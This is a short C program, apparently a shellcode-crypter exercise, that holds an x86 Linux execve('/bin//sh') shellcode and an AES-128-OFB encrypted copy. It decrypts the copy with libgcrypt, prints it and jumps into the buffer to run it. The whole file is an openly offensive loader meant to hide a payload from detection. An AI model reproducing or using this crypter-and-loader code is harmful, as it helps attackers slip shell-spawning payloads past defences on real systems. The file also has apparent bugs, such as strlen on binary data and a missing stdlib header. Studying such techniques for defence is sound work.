#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <gcrypt.h>


const char *key = "eaxebxecxedx";

uint8_t iv[] = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\xf0\x10";  
uint8_t ctr[] = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\xf0\x10"; 
//execve-stack
uint8_t oriShellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";
uint8_t encryptedShellcode[] = "\x5e\x12\xb4\xb8\x0d\x0f\x55\x6d\xbd\x4b\xd5\x02\x31\xd4\x70\x38\x58\xf2\xaf\x3d\xef\x93\x8b\x7a\xd2";


int main(){

    int i=0;
    int algo = gcry_cipher_map_name("aes128");
    size_t size = strlen(oriShellcode);
    uint8_t *decryptedShellcode = malloc(size);
    
    gcry_cipher_hd_t hd;
    gcry_cipher_open(&hd, algo, GCRY_CIPHER_MODE_OFB, 0);
    gcry_cipher_setkey(hd, key, 16);
    gcry_cipher_setiv(hd, iv, 16);
    gcry_cipher_setctr(hd, ctr, 16);
    gcry_cipher_decrypt(hd, decryptedShellcode, size, encryptedShellcode, size);
    
    printf("Decrypted Shellcode = ");
    for(i=0; i<size; i++){
        printf("\\x%02x", decryptedShellcode[i]);
    }
    printf("\n\n");

    int (*ret)() = (int(*)())decryptedShellcode;
    printf("Running shellcode...\n");
    ret();
    
    gcry_cipher_close(hd);
    free(decryptedShellcode);

    return 0;
}
